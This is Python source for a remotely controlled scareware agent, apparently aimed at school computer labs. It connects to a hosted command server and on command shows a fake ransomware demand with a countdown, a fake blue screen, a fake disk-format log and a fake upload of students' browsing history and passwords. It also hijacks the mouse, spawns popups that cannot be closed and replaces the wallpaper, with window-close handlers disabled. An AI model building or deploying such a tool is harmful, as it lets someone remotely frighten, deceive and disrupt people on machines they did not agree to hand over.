import threading
import tkinter as tk
import socketio
import pyautogui
import ctypes
import time
import random
import sys
import os

SERVER_URL = "https://nevric-production.up.railway.app"

sio = socketio.Client(reconnection=True, reconnection_attempts=0)
pc_id = "UNKNOWN"

root = tk.Tk()
root.withdraw()
root.protocol("WM_DELETE_WINDOW", lambda: None)

active_threads = {"ghost_mouse": False, "popup_spam": False}

def clear_window():
    for widget in root.winfo_children():
        widget.destroy()

def setup_fullscreen(bg_color="black"):
    root.deiconify()
    root.attributes("-fullscreen", True)
    root.configure(bg=bg_color, cursor="none")
    root.lift()
    root.attributes("-topmost", True)
    clear_window()

def restore():
    active_threads["ghost_mouse"] = False
    active_threads["popup_spam"] = False
    root.attributes("-fullscreen", False)
    root.attributes("-topmost", False)
    root.configure(cursor="arrow")
    root.withdraw()
    clear_window()
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, "", 0)
    except:
        pass

@sio.event
def connect():
    sio.emit("register-agent")

@sio.event
def disconnect():
    root.after(0, restore)

@sio.on("assigned-id")
def assigned_id(data):
    global pc_id
    pc_id = data.get("id", "UNKNOWN") if isinstance(data, dict) else str(data)

@sio.on("lab-full")
def lab_full():
    pass

@sio.on("agent-command")
def agent_command(data):
    command = data.get("command")
    
    if command == "RANSOMWARE":
        root.after(0, show_ransomware)
    elif command == "BSOD":
        root.after(0, show_bsod)
    elif command == "GHOST_MOUSE":
        if not active_threads["ghost_mouse"]:
            active_threads["ghost_mouse"] = True
            threading.Thread(target=ghost_mouse_loop, daemon=True).start()
    elif command == "FORMAT_C":
        root.after(0, show_format_c)
    elif command == "DATA_LEAK":
        root.after(0, show_data_leak)
    elif command == "POPUP_SPAM":
        if not active_threads["popup_spam"]:
            active_threads["popup_spam"] = True
            threading.Thread(target=popup_spam_loop, daemon=True).start()
    elif command == "WALLPAPER":
        threading.Thread(target=hijack_wallpaper, daemon=True).start()
    elif command == "RESTORE":
        root.after(0, restore)

def show_ransomware():
    setup_fullscreen(bg_color="#660000")
    tk.Label(root, text="YOUR FILES ARE ENCRYPTED", fg="white", bg="#660000", font=("Consolas", 36, "bold")).pack(pady=50)
    tk.Label(root, text="PAY 1.5 BTC TO UNLOCK YOUR SYSTEM", fg="yellow", bg="#660000", font=("Consolas", 20)).pack(pady=20)
    
    timer_var = tk.StringVar()
    tk.Label(root, textvariable=timer_var, fg="white", bg="black", font=("Consolas", 48, "bold")).pack(pady=40)
    
    def countdown(t):
        if not root.winfo_ismapped() or root.cget("bg") != "#660000": return
        mins, secs = divmod(t, 60)
        timer_var.set(f"{mins:02d}:{secs:02d}")
        if t > 0:
            root.after(1000, countdown, t - 1)
    countdown(3600)

def show_bsod():
    setup_fullscreen(bg_color="#0000AA")
    text = (
        "A problem has been detected and Windows has been shut down to prevent damage\n"
        "to your computer.\n\n"
        "DRIVER_IRQL_NOT_LESS_OR_EQUAL\n\n"
        "If this is the first time you've seen this stop error screen,\n"
        "restart your computer. If this screen appears again, follow\n"
        "these steps:\n\n"
        "Check to make sure any new hardware or software is properly installed.\n"
        "If this is a new installation, ask your hardware or software manufacturer\n"
        "for any Windows updates you might need.\n\n"
        "Technical information:\n\n"
        "*** STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000000,0xF86B5A89)\n"
    )
    tk.Label(root, text=text, fg="white", bg="#0000AA", font=("Lucida Console", 14), justify="left").pack(anchor="nw", padx=50, pady=50)

def ghost_mouse_loop():
    pyautogui.FAILSAFE = False
    while active_threads["ghost_mouse"]:
        x, y = random.randint(-50, 50), random.randint(-50, 50)
        try:
            pyautogui.moveRel(x, y, duration=0.2)
        except:
            pass
        time.sleep(random.uniform(0.1, 0.5))

def show_format_c():
    setup_fullscreen(bg_color="black")
    log_text = tk.Text(root, bg="black", fg="#00ff66", font=("Consolas", 14), bd=0)
    log_text.pack(fill="both", expand=True, padx=20, pady=20)
    log_text.insert(tk.END, "Microsoft Windows [Version 10.0.19045.3803]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> format C: /fs:ntfs /q /y\n\n")
    
    def format_progress(pct):
        if not root.winfo_ismapped() or log_text.winfo_exists() == 0: return
        log_text.insert(tk.END, f"Formatting Local Disk (C:)... {pct}%\n")
        log_text.see(tk.END)
        if pct < 100:
            root.after(random.randint(100, 500), format_progress, pct + 1)
        else:
            log_text.insert(tk.END, "Format complete. Restarting system...\n")
    
    format_progress(0)

def show_data_leak():
    setup_fullscreen(bg_color="black")
    tk.Label(root, text="UPLOADING HISTORY TO SCHOOL SERVER...", fg="red", bg="black", font=("Consolas", 24, "bold")).pack(pady=20)
    
    log_text = tk.Text(root, bg="black", fg="white", font=("Consolas", 14), bd=0)
    log_text.pack(fill="both", expand=True, padx=20)
    
    histories = [
        "Google: cara bolos sekolah tanpa ketahuan",
        "Google: kunci jawaban ujian akhir semester RPL",
        "Google: cara hack wifi sekolah",
        "Google: alasan sakit yang masuk akal untuk guru",
        "Google: cara menghapus histori browser permanen",
        "Google: game online gratis tanpa blokir",
        "Local: C:\\Users\\Student\\Documents\\CheatSheet.txt",
        "Uploading SAM database... [OK]",
        "Extracting saved passwords from Chrome... [OK]"
    ]
    
    def leak_progress(idx):
        if not root.winfo_ismapped() or log_text.winfo_exists() == 0: return
        log_text.insert(tk.END, f"> {histories[idx % len(histories)]}\n")
        log_text.see(tk.END)
        root.after(random.randint(50, 200), leak_progress, idx + 1)
        
    leak_progress(0)

def popup_spam_loop():
    while active_threads["popup_spam"]:
        def create_popup():
            if not active_threads["popup_spam"]: return
            top = tk.Toplevel(root)
            top.title("Critical Error")
            w, h = 300, 100
            x = random.randint(0, root.winfo_screenwidth() - w)
            y = random.randint(0, root.winfo_screenheight() - h)
            top.geometry(f"{w}x{h}+{x}+{y}")
            top.configure(bg="#f0f0f0")
            top.protocol("WM_DELETE_WINDOW", lambda: None)
            tk.Label(top, text="System Failure Detected!", font=("Arial", 12), fg="red").pack(expand=True)
            if active_threads["popup_spam"]:
                root.after(200, create_popup)
        
        root.after(0, create_popup)
        break

def hijack_wallpaper():
    bmp_path = os.path.abspath("hacked.bmp")
    if not os.path.exists(bmp_path):
        with open(bmp_path, "wb") as f:
            f.write(b'BM:\x00\x00\x00\x00\x00\x00\x006\x00\x00\x00(\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x18\x00\x00\x00\x00\x00\x04\x00\x00\x00\x13\x0b\x00\x00\x13\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\x00')
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, bmp_path, 3)
    except:
        pass

def run_socket():
    try:
        sio.connect(SERVER_URL, transports=["websocket", "polling"])
        sio.wait()
    except Exception:
        pass

threading.Thread(target=run_socket, daemon=True).start()
root.mainloop()
